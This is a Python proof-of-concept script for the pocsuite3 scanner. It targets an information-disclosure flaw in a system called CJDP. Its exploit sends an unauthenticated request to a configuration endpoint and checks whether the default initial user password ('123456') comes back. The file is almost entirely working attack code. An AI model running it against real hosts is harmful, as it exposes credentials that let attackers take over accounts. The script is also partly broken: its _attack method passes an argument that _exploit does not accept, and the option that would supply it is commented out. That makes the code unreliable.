#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
from urllib.parse import urljoin
import os
minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'xml'
    vulDate = '2023-04-04'
    createDate = '2023-04-04'
    updateDate = '2023-04-04'
    references = []
    name = 'CJDP System Params Information Disclosure'
    appPowerLink = ''
    appName = 'CJDP'
    appVersion = ''
    vulType = 'Information Disclosure'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    severity='high'
    # def _options(self):
    #     o = OrderedDict()
    #     o['param'] = OptString('', description='The param')
    #     return o

    def _exploit(self):
        payload = "/system/config/configKey/sys.user.initPassword"
        res = requests.get(url=self.url+payload)
        logger.debug(res.text)
        return res

    def _verify(self):
        result = {}

        res = self._exploit()
        if '"message":"123456"' in res.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['info'] = {}
            result['VerifyInfo']['info']['Severity']=self.severity
            result['VerifyInfo']['info']['Result']=res.text
            result['VerifyInfo']['info']['file_name'] = os.path.basename(__file__)
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('param')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
